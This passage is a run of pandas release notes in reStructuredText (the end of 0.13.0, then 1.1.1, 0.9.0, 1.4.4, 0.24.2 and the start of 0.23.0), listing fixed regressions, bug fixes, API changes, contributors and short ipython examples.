``np.timedelta64`` or ``np.offsets.DateOffset``\n  when operating with datetimes (:issue:`4532`)\n- Fix arithmetic with series/datetimeindex and ``np.timedelta64`` not working\n  the same (:issue:`4134`) and buggy timedelta in NumPy 1.6 (:issue:`4135`)\n- Fix bug in ``pd.read_clipboard`` on windows with PY3 (:issue:`4561`); not\n  decoding properly\n- ``tslib.get_period_field()`` and ``tslib.get_period_field_arr()`` now raise\n  if code argument out of range (:issue:`4519`, :issue:`4520`)\n- Fix boolean indexing on an empty series loses index names (:issue:`4235`),\n  infer_dtype works with empty arrays.\n- Fix reindexing with multiple axes; if an axes match was not replacing the\n  current axes, leading to a possible lazy frequency inference issue\n  (:issue:`3317`)\n- Fixed issue where ``DataFrame.apply`` was reraising exceptions incorrectly\n  (causing the original stack trace to be truncated).\n- Fix selection with ``ix/loc`` and non_unique selectors (:issue:`4619`)\n- Fix assignment with iloc/loc involving a dtype change in an existing column\n  (:issue:`4312`, :issue:`5702`) have internal setitem_with_indexer in core/indexing\n  to use Block.setitem\n- Fixed bug where thousands operator was not handled correctly for floating\n  point numbers in csv_import (:issue:`4322`)\n- Fix an issue with CacheableOffset not properly being used by many\n  DateOffset; this prevented the DateOffset from being cached (:issue:`4609`)\n- Fix boolean comparison with a DataFrame on the lhs, and a list/tuple on the\n  rhs (:issue:`4576`)\n- Fix error/dtype conversion with setitem of ``None`` on ``Series/DataFrame``\n  (:issue:`4667`)\n- Fix decoding based on a passed in non-default encoding in ``pd.read_stata``\n  (:issue:`4626`)\n- Fix ``DataFrame.from_records`` with a plain-vanilla ``ndarray``.\n  (:issue:`4727`)\n- Fix some inconsistencies with ``Index.rename`` and ``MultiIndex.rename``,\n  etc. (:issue:`4718`, :issue:`4628`)\n- Bug in using ``iloc/loc`` with a cross-sectional and duplicate indices\n  (:issue:`4726`)\n- Bug with using ``QUOTE_NONE`` with ``to_csv`` causing ``Exception``.\n  (:issue:`4328`)\n- Bug with Series indexing not raising an error when the right-hand-side has\n  an incorrect length (:issue:`2702`)\n- Bug in MultiIndexing with a partial string selection as one part of a\n  MultIndex (:issue:`4758`)\n- Bug with reindexing on the index with a non-unique index will now raise\n  ``ValueError`` (:issue:`4746`)\n- Bug in setting with ``loc/ix`` a single indexer with a MultiIndex axis and\n  a NumPy array, related to (:issue:`3777`)\n- Bug in concatenation with duplicate columns across dtypes not merging with\n  axis=0 (:issue:`4771`, :issue:`4975`)\n- Bug in ``iloc`` with a slice index failing (:issue:`4771`)\n- Incorrect error message with no colspecs or width in ``read_fwf``.\n  (:issue:`4774`)\n- Fix bugs in indexing in a Series with a duplicate index (:issue:`4548`,\n  :issue:`4550`)\n- Fixed bug with reading compressed files with ``read_fwf`` in Python 3.\n  (:issue:`3963`)\n- Fixed an issue with a duplicate index and assignment with a dtype change\n  (:issue:`4686`)\n- Fixed bug with reading compressed files in as ``bytes`` rather than ``str``\n  in Python 3. Simplifies bytes-producing file-handling in Python 3\n  (:issue:`3963`, :issue:`4785`).\n- Fixed an issue related to ticklocs/ticklabels with log scale bar plots\n  across different versions of matplotlib (:issue:`4789`)\n- Suppressed DeprecationWarning associated with internal calls issued by\n  repr() (:issue:`4391`)\n- Fixed an issue with a duplicate index and duplicate selector with ``.loc``\n  (:issue:`4825`)\n- Fixed an issue with ``DataFrame.sort_index`` where, when sorting by a\n  single column and passing a list for ``ascending``, the argument for\n  ``ascending`` was being interpreted as ``True`` (:issue:`4839`,\n  :issue:`4846`)\n- Fixed ``Panel.tshift`` not working. Added ``freq`` support to ``Panel.shift``\n  (:issue:`4853`)\n- Fix an issue in TextFileReader w/ Python engine (i.e. PythonParser)\n  with thousands != \",\" (:issue:`4596`)\n- Bug in getitem with a duplicate index when using where (:issue:`4879`)\n- Fix Type inference code coerces float column into datetime (:issue:`4601`)\n- Fixed ``_ensure_numeric`` does not check for complex numbers\n  (:issue:`4902`)\n- Fixed a bug in ``Series.hist`` where two figures were being created when\n  the ``by`` argument was passed (:issue:`4112`, :issue:`4113`).\n- Fixed a bug in ``convert_objects`` for > 2 ndims (:issue:`4937`)\n- Fixed a bug in DataFrame/Panel cache insertion and subsequent indexing\n  (:issue:`4939`, :issue:`5424`)\n- Fixed string methods for ``FrozenNDArray`` and ``FrozenList``\n  (:issue:`4929`)\n- Fixed a bug with setting invalid or out-of-range values in indexing\n  enlargement scenarios (:issue:`4940`)\n- Tests for fillna on empty Series (:issue:`4346`), thanks immerrr\n- Fixed ``copy()`` to shallow copy axes/indices as well and thereby keep\n  separate metadata. (:issue:`4202`, :issue:`4830`)\n- Fixed skiprows option in Python parser for read_csv (:issue:`4382`)\n- Fixed bug preventing ``cut`` from working with ``np.inf`` levels without\n  explicitly passing labels (:issue:`3415`)\n- Fixed wrong check for overlapping in ``DatetimeIndex.union``\n  (:issue:`4564`)\n- Fixed conflict between thousands separator and date parser in csv_parser\n  (:issue:`4678`)\n- Fix appending when dtypes are not the same (error showing mixing\n  float/np.datetime64) (:issue:`4993`)\n- Fix repr for DateOffset. No longer show duplicate entries in kwds.\n  Removed unused offset fields. (:issue:`4638`)\n- Fixed wrong index name during read_csv if using usecols. Applies to c\n  parser only. (:issue:`4201`)\n- ``Timestamp`` objects can now appear in the left hand side of a comparison\n  operation with a ``Series`` or ``DataFrame`` object (:issue:`4982`).\n- Fix a bug when indexing with ``np.nan`` via ``iloc/loc`` (:issue:`5016`)\n- Fixed a bug where low memory c parser could create different types in\n  different chunks of the same file. Now coerces to numerical type or raises\n  warning. (:issue:`3866`)\n- Fix a bug where reshaping a ``Series`` to its own shape raised\n  ``TypeError`` (:issue:`4554`) and other reshaping issues.\n- Bug in setting with ``ix/loc`` and a mixed int/string index (:issue:`4544`)\n- Make sure series-series boolean comparisons are label based (:issue:`4947`)\n- Bug in multi-level indexing with a Timestamp partial indexer\n  (:issue:`4294`)\n- Tests/fix for MultiIndex construction of an all-nan frame (:issue:`4078`)\n- Fixed a bug where :func:`~pandas.read_html` wasn't correctly inferring\n  values of tables with commas (:issue:`5029`)\n- Fixed a bug where :func:`~pandas.read_html` wasn't providing a stable\n  ordering of returned tables (:issue:`4770`, :issue:`5029`).\n- Fixed a bug where :func:`~pandas.read_html` was incorrectly parsing when\n  passed ``index_col=0`` (:issue:`5066`).\n- Fixed a bug where :func:`~pandas.read_html` was incorrectly inferring the\n  type of headers (:issue:`5048`).\n- Fixed a bug where ``DatetimeIndex`` joins with ``PeriodIndex`` caused a\n  stack overflow (:issue:`3899`).\n- Fixed a bug where ``groupby`` objects didn't allow plots (:issue:`5102`).\n- Fixed a bug where ``groupby`` objects weren't tab-completing column names\n  (:issue:`5102`).\n- Fixed a bug where ``groupby.plot()`` and friends were duplicating figures\n  multiple times (:issue:`5102`).\n- Provide automatic conversion of ``object`` dtypes on fillna, related\n  (:issue:`5103`)\n- Fixed a bug where default options were being overwritten in the option\n  parser cleaning (:issue:`5121`).\n- Treat a list/ndarray identically for ``iloc`` indexing with list-like\n  (:issue:`5006`)\n- Fix ``MultiIndex.get_level_values()`` with missing values (:issue:`5074`)\n- Fix bound checking for Timestamp() with datetime64 input (:issue:`4065`)\n- Fix a bug where ``TestReadHtml`` wasn't calling the correct ``read_html()``\n  function (:issue:`5150`).\n- Fix a bug with ``NDFrame.replace()`` which made replacement appear as\n  though it was (incorrectly) using regular expressions (:issue:`5143`).\n- Fix better error message for to_datetime (:issue:`4928`)\n- Made sure different locales are tested on travis-ci (:issue:`4918`). Also\n  adds a couple of utilities for getting locales and setting locales with a\n  context manager.\n- Fixed segfault on ``isnull(MultiIndex)`` (now raises an error instead)\n  (:issue:`5123`, :issue:`5125`)\n- Allow duplicate indices when performing operations that align\n  (:issue:`5185`, :issue:`5639`)\n- Compound dtypes in a constructor raise ``NotImplementedError``\n  (:issue:`5191`)\n- Bug in comparing duplicate frames (:issue:`4421`) related\n- Bug in describe on duplicate frames\n- Bug in ``to_datetime`` with a format and ``coerce=True`` not raising\n  (:issue:`5195`)\n- Bug in ``loc`` setting with multiple indexers and a rhs of a Series that\n  needs broadcasting (:issue:`5206`)\n- Fixed bug where inplace setting of levels or labels on ``MultiIndex`` would\n  not clear cached ``values`` property and therefore return wrong ``values``.\n  (:issue:`5215`)\n- Fixed bug where filtering a grouped DataFrame or Series did not maintain\n  the original ordering (:issue:`4621`).\n- Fixed ``Period`` with a business date freq to always roll-forward if on a\n  non-business date. (:issue:`5203`)\n- Fixed bug in Excel writers where frames with duplicate column names weren't\n  written correctly. (:issue:`5235`)\n- Fixed issue with ``drop`` and a non-unique index on Series (:issue:`5248`)\n- Fixed segfault in C parser caused by passing more names than columns in\n  the file. (:issue:`5156`)\n- Fix ``Series.isin`` with date/time-like dtypes (:issue:`5021`)\n- C and Python Parser can now handle the more common MultiIndex column\n  format which doesn't have a row for index names (:issue:`4702`)\n- Bug when trying to use an out-of-bounds date as an object dtype\n  (:issue:`5312`)\n- Bug when trying to display an embedded PandasObject (:issue:`5324`)\n- Allows operating of Timestamps to return a datetime if the result is out-of-bounds\n  related (:issue:`5312`)\n- Fix return value/type signature of ``initObjToJSON()`` to be compatible\n  with numpy's ``import_array()`` (:issue:`5334`, :issue:`5326`)\n- Bug when renaming then set_index on a DataFrame (:issue:`5344`)\n- Test suite no longer leaves around temporary files when testing graphics. (:issue:`5347`)\n  (thanks for catching this yarikoptic!)\n- Fixed html tests on win32. (:issue:`4580`)\n- Make sure that ``head/tail`` are ``iloc`` based, (:issue:`5370`)\n- Fixed bug for ``PeriodIndex`` string representation if there are 1 or 2\n  elements. (:issue:`5372`)\n- The GroupBy methods ``transform`` and ``filter`` can be used on Series\n  and DataFrames that have repeated (non-unique) indices. (:issue:`4620`)\n- Fix empty series not printing name in repr (:issue:`4651`)\n- Make tests create temp files in temp directory by default. (:issue:`5419`)\n- ``pd.to_timedelta`` of a scalar returns a scalar (:issue:`5410`)\n- ``pd.to_timedelta`` accepts ``NaN`` and ``NaT``, returning ``NaT`` instead of raising (:issue:`5437`)\n- performance improvements in ``isnull`` on larger size pandas objects\n- Fixed various setitem with 1d ndarray that does not have a matching\n  length to the indexer (:issue:`5508`)\n- Bug in getitem with a MultiIndex and ``iloc`` (:issue:`5528`)\n- Bug in delitem on a Series (:issue:`5542`)\n- Bug fix in apply when using custom function and objects are not mutated (:issue:`5545`)\n- Bug in selecting from a non-unique index with ``loc`` (:issue:`5553`)\n- Bug in groupby returning non-consistent types when user function returns a ``None``, (:issue:`5592`)\n- Work around regression in numpy 1.7.0 which erroneously raises IndexError from ``ndarray.item`` (:issue:`5666`)\n- Bug in repeated indexing of object with resultant non-unique index (:issue:`5678`)\n- Bug in fillna with Series and a passed series/dict (:issue:`5703`)\n- Bug in groupby transform with a datetime-like grouper (:issue:`5712`)\n- Bug in MultiIndex selection in PY3 when using certain keys (:issue:`5725`)\n- Row-wise concat of differing dtypes failing in certain cases (:issue:`5754`)\n\n.. _whatsnew_0.13.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.12.0..v0.13.0\n\n\n.. _whatsnew_111:\n\nWhat's new in 1.1.1 (August 20, 2020)\n-------------------------------------\n\nThese are the changes in pandas 1.1.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`CategoricalIndex.format` where, when stringified scalars had different lengths, the shorter string would be right-filled with spaces, so it had the same length as the longest string (:issue:`35439`)\n- Fixed regression in :meth:`Series.truncate` when trying to truncate a single-element series (:issue:`35544`)\n- Fixed regression where :meth:`DataFrame.to_numpy` would raise a ``RuntimeError`` for mixed dtypes when converting to ``str`` (:issue:`35455`)\n- Fixed regression where :func:`read_csv` would raise a ``ValueError`` when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`35493`)\n- Fixed regression where :func:`pandas.testing.assert_series_equal` would raise an error when non-numeric dtypes were passed with ``check_exact=True`` (:issue:`35446`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where column selection was ignored (:issue:`35486`)\n- Fixed regression where :meth:`DataFrame.interpolate` would raise a ``TypeError`` when the :class:`DataFrame` was empty (:issue:`35598`)\n- Fixed regression in :meth:`DataFrame.shift` with ``axis=1`` and heterogeneous dtypes (:issue:`35488`)\n- Fixed regression in :meth:`DataFrame.diff` with read-only data (:issue:`35559`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where a segfault would occur with ``center=True`` and an odd number of values (:issue:`35552`)\n- Fixed regression in :meth:`DataFrame.apply` where functions that altered the input in-place only operated on a single row (:issue:`35462`)\n- Fixed regression in :meth:`DataFrame.reset_index` would raise a ``ValueError`` on empty :class:`DataFrame` with a :class:`MultiIndex` with a ``datetime64`` dtype level (:issue:`35606`, :issue:`35657`)\n- Fixed regression where :func:`pandas.merge_asof` would raise a ``UnboundLocalError`` when ``left_index``, ``right_index`` and ``tolerance`` were set (:issue:`35558`)\n- Fixed regression in ``.groupby(..).rolling(..)`` where a custom ``BaseIndexer`` would be ignored (:issue:`35557`)\n- Fixed regression in :meth:`DataFrame.replace` and :meth:`Series.replace` where compiled regular expressions would be ignored during replacement (:issue:`35680`)\n- Fixed regression in :meth:`.DataFrameGroupBy.aggregate` where a list of functions would produce the wrong results if at least one of the functions did not aggregate (:issue:`35490`)\n- Fixed memory usage issue when instantiating large :class:`pandas.arrays.StringArray` (:issue:`35499`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in :class:`~pandas.io.formats.style.Styler` whereby ``cell_ids`` argument had no effect due to other recent changes (:issue:`35588`) (:issue:`35663`)\n- Bug in :func:`pandas.testing.assert_series_equal` and :func:`pandas.testing.assert_frame_equal` where extension dtypes were not ignored when ``check_dtypes`` was set to ``False`` (:issue:`35715`)\n- Bug in :meth:`to_timedelta` fails when ``arg`` is a :class:`Series` with ``Int64`` dtype containing null values (:issue:`35574`)\n- Bug in ``.groupby(..).rolling(..)`` where passing ``closed`` with column selection would raise a ``ValueError`` (:issue:`35549`)\n- Bug in :class:`DataFrame` constructor failing to raise ``ValueError`` in some cases when ``data`` and ``index`` have mismatched lengths (:issue:`33437`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_111.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.0..v1.1.1\n\n\n.. _whatsnew_0900:\n\n{{ header }}\n\n\nVersion 0.9.0 (October 7, 2012)\n-------------------------------\n\nThis is a major release from 0.8.1 and includes several new features and\nenhancements along with a large number of bug fixes. New features include\nvectorized unicode encoding/decoding for ``Series.str``, ``to_latex`` method to\nDataFrame, more flexible parsing of boolean values, and enabling the download of\noptions data from Yahoo! Finance.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add ``encode`` and ``decode`` for unicode handling to :ref:`vectorized\n    string processing methods <text.string_methods>` in Series.str  (:issue:`1706`)\n  - Add ``DataFrame.to_latex`` method (:issue:`1735`)\n  - Add convenient expanding window equivalents of all rolling_* ops (:issue:`1785`)\n  - Add Options class to pandas.io.data for fetching options data from Yahoo!\n    Finance (:issue:`1748`, :issue:`1739`)\n  - More flexible parsing of boolean values (Yes, No, TRUE, FALSE, etc)\n    (:issue:`1691`, :issue:`1295`)\n  - Add ``level`` parameter to ``Series.reset_index``\n  - ``TimeSeries.between_time`` can now select times across midnight (:issue:`1871`)\n  - Series constructor can now handle generator as input (:issue:`1679`)\n  - ``DataFrame.dropna`` can now take multiple axes (tuple/list) as input\n    (:issue:`924`)\n  - Enable ``skip_footer`` parameter in ``ExcelFile.parse`` (:issue:`1843`)\n\nAPI changes\n~~~~~~~~~~~\n\n  - The default column names when ``header=None`` and no columns names passed to\n    functions like ``read_csv`` has changed to be more Pythonic and amenable to\n    attribute access:\n\n.. ipython:: python\n\n   import io\n\n   data = \"\"\"\n   0,0,1\n   1,1,0\n   0,1,0\n   \"\"\"\n   df = pd.read_csv(io.StringIO(data), header=None)\n   df\n\n\n- Creating a Series from another Series, passing an index, will cause reindexing\n  to happen inside rather than treating the Series like an ndarray. Technically\n  improper usages like ``Series(df[col1], index=df[col2])`` that worked before\n  \"by accident\" (this was never intended) will lead to all NA Series in some\n  cases. To be perfectly clear:\n\n.. ipython:: python\n\n   s1 = pd.Series([1, 2, 3])\n   s1\n\n   s2 = pd.Series(s1, index=[\"foo\", \"bar\", \"baz\"])\n   s2\n\n- Deprecated ``day_of_year`` API removed from PeriodIndex, use ``dayofyear``\n  (:issue:`1723`)\n\n- Don't modify NumPy suppress printoption to True at import time\n\n- The internal HDF5 data arrangement for DataFrames has been transposed.  Legacy\n  files will still be readable by HDFStore (:issue:`1834`, :issue:`1824`)\n\n- Legacy cruft removed: pandas.stats.misc.quantileTS\n\n- Use ISO8601 format for Period repr: monthly, daily, and on down (:issue:`1776`)\n\n- Empty DataFrame columns are now created as object dtype. This will prevent a\n  class of TypeErrors that was occurring in code where the dtype of a column\n  would depend on the presence of data or not (e.g. a SQL query having results)\n  (:issue:`1783`)\n\n- Setting parts of DataFrame/Panel using ix now aligns input Series/DataFrame\n  (:issue:`1630`)\n\n- ``first`` and ``last`` methods in ``GroupBy`` no longer drop non-numeric\n  columns (:issue:`1809`)\n\n- Resolved inconsistencies in specifying custom NA values in text parser.\n  ``na_values`` of type dict no longer override default NAs unless\n  ``keep_default_na`` is set to false explicitly (:issue:`1657`)\n\n- ``DataFrame.dot`` will not do data alignment, and also work with Series\n  (:issue:`1915`)\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n\n.. _whatsnew_0.9.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.8.1..v0.9.0\n\n\n.. _whatsnew_144:\n\nWhat's new in 1.4.4 (August 31, 2022)\n-------------------------------------\n\nThese are the changes in pandas 1.4.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.fillna` not working on a :class:`DataFrame` with a :class:`MultiIndex` (:issue:`47649`)\n- Fixed regression in taking NULL :class:`objects` from a :class:`DataFrame` causing a segmentation violation. These NULL values are created by :meth:`numpy.empty_like` (:issue:`46848`)\n- Fixed regression in :func:`concat` materializing the :class:`Index` during sorting even if the :class:`Index` was already sorted (:issue:`47501`)\n- Fixed regression in :func:`concat` or :func:`merge` handling of all-NaN ExtensionArrays with custom attributes (:issue:`47762`)\n- Fixed regression in calling bitwise numpy ufuncs (for example, ``np.bitwise_and``) on Index objects (:issue:`46769`)\n- Fixed regression in :func:`cut` when using a ``datetime64`` IntervalIndex as bins (:issue:`46218`)\n- Fixed regression in :meth:`DataFrame.select_dtypes` where ``include=\"number\"`` included :class:`BooleanDtype` (:issue:`46870`)\n- Fixed regression in :meth:`DataFrame.loc` raising error when indexing with a ``NamedTuple`` (:issue:`48124`)\n- Fixed regression in :meth:`DataFrame.loc` not updating the cache correctly after values were set (:issue:`47867`)\n- Fixed regression in :meth:`DataFrame.loc` not aligning index in some cases when setting a :class:`DataFrame` (:issue:`47578`)\n- Fixed regression in :meth:`DataFrame.loc` setting a length-1 array like value to a single value in the DataFrame (:issue:`46268`)\n- Fixed regression when slicing with :meth:`DataFrame.loc` with :class:`DatetimeIndex` with a :class:`.DateOffset` object for its ``freq`` (:issue:`46671`)\n- Fixed regression in setting ``None`` or non-string value into a ``string``-dtype Series using a mask (:issue:`47628`)\n- Fixed regression in updating a DataFrame column through Series ``__setitem__`` (using chained assignment) not updating column values inplace and using too much memory (:issue:`47172`)\n- Fixed regression in :meth:`DataFrame.select_dtypes` returning a view on the original DataFrame (:issue:`48090`)\n- Fixed regression using custom Index subclasses (for example, used in xarray) with :meth:`~DataFrame.reset_index` or :meth:`Index.insert` (:issue:`47071`)\n- Fixed regression in :meth:`~Index.intersection` when the :class:`DatetimeIndex` has dates crossing daylight savings time (:issue:`46702`)\n- Fixed regression in :func:`merge` throwing an error when passing a :class:`Series` with a multi-level name (:issue:`47946`)\n- Fixed regression in :meth:`DataFrame.eval` creating a copy when updating inplace (:issue:`47449`)\n- Fixed regression where getting a row using :meth:`DataFrame.iloc` with :class:`SparseDtype` would raise (:issue:`46406`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- The ``FutureWarning`` raised when passing arguments (other than ``filepath_or_buffer``) as positional in :func:`read_csv` is now raised at the correct stacklevel (:issue:`47385`)\n- Bug in :meth:`DataFrame.to_sql` when ``method`` was a ``callable`` that did not return an ``int`` and would raise a ``TypeError`` (:issue:`46891`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` where ``subset`` had no effect (:issue:`46383`)\n- Bug when getting values with :meth:`DataFrame.loc` with a list of keys causing an internal inconsistency that could lead to a disconnect between ``frame.at[x, y]`` vs ``frame[y].loc[x]`` (:issue:`22372`)\n- Bug in the :meth:`Series.dt.strftime` accessor return a float instead of object dtype Series for all-NaT input, which also causes a spurious deprecation warning (:issue:`45858`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.32`` (:issue:`47978`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_144.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.3..v1.4.4|HEAD\n\n\n.. _whatsnew_0242:\n\nWhat's new in 0.24.2 (March 12, 2019)\n-------------------------------------\n\n.. warning::\n\n   The 0.24.x series of releases will be the last to support Python 2. Future feature\n   releases will support Python 3 only. See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more.\n\n{{ header }}\n\nThese are the changes in pandas 0.24.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n.. _whatsnew_0242.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`DataFrame.all` and :meth:`DataFrame.any` where ``bool_only=True`` was ignored (:issue:`25101`)\n- Fixed issue in ``DataFrame`` construction with passing a mixed list of mixed types could segfault. (:issue:`25075`)\n- Fixed regression in :meth:`DataFrame.apply` causing ``RecursionError`` when ``dict``-like classes were passed as argument. (:issue:`25196`)\n- Fixed regression in :meth:`DataFrame.replace` where ``regex=True`` was only replacing patterns matching the start of the string (:issue:`25259`)\n- Fixed regression in :meth:`DataFrame.duplicated()`, where empty dataframe was not returning a boolean dtyped Series. (:issue:`25184`)\n- Fixed regression in :meth:`Series.min` and :meth:`Series.max` where ``numeric_only=True`` was ignored when the ``Series`` contained ``Categorical`` data (:issue:`25299`)\n- Fixed regression in subtraction between :class:`Series` objects with ``datetime64[ns]`` dtype incorrectly raising ``OverflowError`` when the ``Series`` on the right contains null values (:issue:`25317`)\n- Fixed regression in :class:`TimedeltaIndex` where ``np.sum(index)`` incorrectly returned a zero-dimensional object instead of a scalar (:issue:`25282`)\n- Fixed regression in ``IntervalDtype`` construction where passing an incorrect string with 'Interval' as a prefix could result in a ``RecursionError``. (:issue:`25338`)\n- Fixed regression in creating a period-dtype array from a read-only NumPy array of period objects. (:issue:`25403`)\n- Fixed regression in :class:`Categorical`, where constructing it from a categorical ``Series`` and an explicit ``categories=`` that differed from that in the ``Series`` created an invalid object which could trigger segfaults. (:issue:`25318`)\n- Fixed regression in :func:`to_timedelta` losing precision when converting floating data to ``Timedelta`` data (:issue:`25077`).\n- Fixed pip installing from source into an environment without NumPy (:issue:`25193`)\n- Fixed regression in :meth:`DataFrame.replace` where large strings of numbers would be coerced into ``int64``, causing an ``OverflowError`` (:issue:`25616`)\n- Fixed regression in :func:`factorize` when passing a custom ``na_sentinel`` value with ``sort=True`` (:issue:`25409`).\n- Fixed regression in :meth:`DataFrame.to_csv` writing duplicate line endings with gzip compress (:issue:`25311`)\n\n.. _whatsnew_0242.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**I/O**\n\n- Better handling of terminal printing when the terminal dimensions are not known (:issue:`25080`)\n- Bug in reading a HDF5 table-format ``DataFrame`` created in Python 2, in Python 3 (:issue:`24925`)\n- Bug in reading a JSON with ``orient='table'`` generated by :meth:`DataFrame.to_json` with ``index=False`` (:issue:`25170`)\n- Bug where float indexes could have misaligned values when printing (:issue:`25061`)\n\n**Categorical**\n\n- Bug where calling :meth:`Series.replace` on categorical data could return a ``Series`` with incorrect dimensions (:issue:`24971`)\n-\n\n**Reshaping**\n\n- Bug in :meth:`.GroupBy.transform` where applying a function to a timezone aware column would return a timezone naive result (:issue:`24198`)\n- Bug in :func:`DataFrame.join` when joining on a timezone aware :class:`DatetimeIndex` (:issue:`23931`)\n\n**Visualization**\n\n- Bug in :meth:`Series.plot` where a secondary y axis could not be set to log scale (:issue:`25545`)\n\n**Other**\n\n- Bug in :meth:`Series.is_unique` where single occurrences of ``NaN`` were not considered unique (:issue:`25180`)\n- Bug in :func:`merge` when merging an empty ``DataFrame`` with an ``Int64`` column or a non-empty ``DataFrame`` with an ``Int64`` column that is all ``NaN`` (:issue:`25183`)\n- Bug in ``IntervalTree`` where a ``RecursionError`` occurs upon construction due to an overflow when adding endpoints, which also causes :class:`IntervalIndex` to crash during indexing operations (:issue:`25485`)\n- Bug in :attr:`Series.size` raising for some extension-array-backed ``Series``, rather than returning the size (:issue:`25580`)\n- Bug in resampling raising for nullable integer-dtype columns (:issue:`25580`)\n\n.. _whatsnew_0242.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. Including the contributors hardcoded for this release, as backporting with\n   MeeseeksDev loses the commit authors\n\nA total of 25 people contributed patches to this release. People with a \"+\" by their names contributed a patch for the first time.\n\n* Albert Villanova del Moral\n* Arno Veenstra +\n* chris-b1\n* Devin Petersohn +\n* EternalLearner42 +\n* Flavien Lambert +\n* gfyoung\n* Gioia Ballin\n* jbrockmendel\n* Jeff Reback\n* Jeremy Schendel\n* Johan von Forstner +\n* Joris Van den Bossche\n* Josh\n* Justin Zheng\n* Kendall Masse\n* Matthew Roeschke\n* Max Bolingbroke +\n* rbenes +\n* Sterling Paramore +\n* Tao He +\n* Thomas A Caswell\n* Tom Augspurger\n* Vibhu Agarwal +\n* William Ayd\n* Zach Angell\n\n\n.. _whatsnew_0230:\n\nWhat's new in 0.23.0 (May 15, 2018)\n-----------------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *  noqa F401, F403\n\n\nThis is a major release from 0.22.0 and includes a number of API changes,\ndeprecations, new features, enhancements, and performance improvements along\nwith a large number of bug fixes. We recommend that all users upgrade to this\nversion.\n\nHighlights include:\n\n- :ref:`Round-trippable JSON format with 'table' orient <whatsnew_0230.enhancements.round-trippable_json>`.\n- :ref:`Instantiation from dicts respects order for Python 3.6+ <whatsnew_0230.api_breaking.dict_insertion_order>`.\n- :ref:`Dependent column arguments for assign <whatsnew_0230.enhancements.assign_dependent>`.\n- :ref:`Merging / sorting on a combination of columns and index levels <whatsnew_0230.enhancements.merge_on_columns_and_levels>`.\n- :ref:`Extending pandas with custom types <whatsnew_023.enhancements.extension>`.\n- :ref:`Excluding unobserved categories from groupby <whatsnew_0230.enhancements.categorical_grouping>`.\n- :ref:`Changes to make output shape of DataFrame.apply consistent <whatsnew_0230.api_breaking.apply>`.\n\nCheck the :ref:`API Changes <whatsnew_0230.api_breaking>` and :ref:`deprecations <whatsnew_0230.deprecations>` before updating.\n\n.. warning::\n\n   Starting January 1, 2019, pandas feature releases will support Python 3 only.\n   See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more.\n\n.. contents:: What's new in v0.23.0\n    :local:\n    :backlinks: none\n    :depth: 2\n\n.. _whatsnew_0230.enhancements:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0230.enhancements.round-trippable_json:\n\nJSON read/write round-trippable with ``orient='table'``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA ``DataFrame`` can now be written to and subsequently read back via JSON while preserving metadata through usage of the ``orient='table'`` argument (see :issue:`18912` and :issue:`9146`). Previously, none of the available ``orient`` values guaranteed the preservation of dtypes and index names, amongst other metadata.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'foo': [1, 2, 3, 4],\n                      'bar': ['a', 'b', 'c', 'd'],\n                      'baz': pd.date_range('2018-01-01', freq='d', periods=4),\n                      'qux': pd.Categorical(['a', 'b', 'c', 'c'])},\n                     index=pd.Index(range(4), name='idx'))\n   df\n   df.dtypes\n   df.to_json('test.json', orient='table')\n   new_df = pd.read_json('test.json', orient='table')\n   new_df\n   new_df.dtypes\n\nPlease note that the string ``index`` is not supported with the round trip format, as it is used by default in ``write_json`` to indicate a missing index name.\n\n.. ipython:: python\n   :okwarning:\n\n   df.index.name = 'index'\n\n   df.to_json('test.json', orient='table')\n   new_df = pd.read_json('test.json', orient='table')\n   new_df\n   new_df.dtypes\n\n.. ipython:: python\n   :suppress:\n\n   import os\n   os.remove('test.json')\n\n\n.. _whatsnew_0230.enhancements.assign_dependent:\n\n\nMethod ``.assign()`` accepts dependent arguments\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :func:`DataFrame.assign` now accepts dependent keyword arguments for python version later than 3.6 (see also `PEP 468\n<https://www.python.org/dev/peps/pep-0468/>`_). Later keyword arguments may now refer to earlier ones if the argument is a callable. See the\n:ref:`documentation here <dsintro.chained_assignment>` (:issue:`14207`)\n\n.. 